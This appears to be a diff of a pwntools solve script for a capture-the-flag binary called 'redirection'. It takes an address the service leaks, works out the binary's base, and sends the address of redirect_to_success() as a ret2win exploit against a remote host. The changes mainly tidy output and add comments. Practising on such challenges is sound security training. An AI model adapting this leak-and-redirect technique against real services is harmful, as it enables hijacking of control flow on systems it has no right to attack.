@@ -9,7 +9,7 @@ TARGET = './redirection'
 HOST = '34.131.133.224'
 PORT = 12346
 
-elf = ELF(TARGET)
+elf = ELF(TARGET, checksec=False)
 #libc = ELF('./libc.so.6')
 #ld = ELF("./ld-2.27.so")
 
@@ -25,18 +25,18 @@ gdb_script = f"""
 
 # ===================================== #
 
-junk = p.recvuntil(b'address: ')
+p.recvuntil(b'address: ')
+
 leak = int(p.recvline().strip().decode(), 16) - 0x11a9
-print(hex(leak))
+print(f"Leaked address : {hex(leak)}")
 
-win = leak + 0x1262
+win = leak + 0x1262 # redirect_to_success()'s offset
+print(f"Win address : {hex(win)}")
 
-print(win)
-
-p.send(hex(win))
+p.sendline(hex(win))
 
 p.interactive()
 p.close()
 
 # NOTE:
-# Extract leaked address and count the base address of the binary
+# Ret2win (with leaked address)
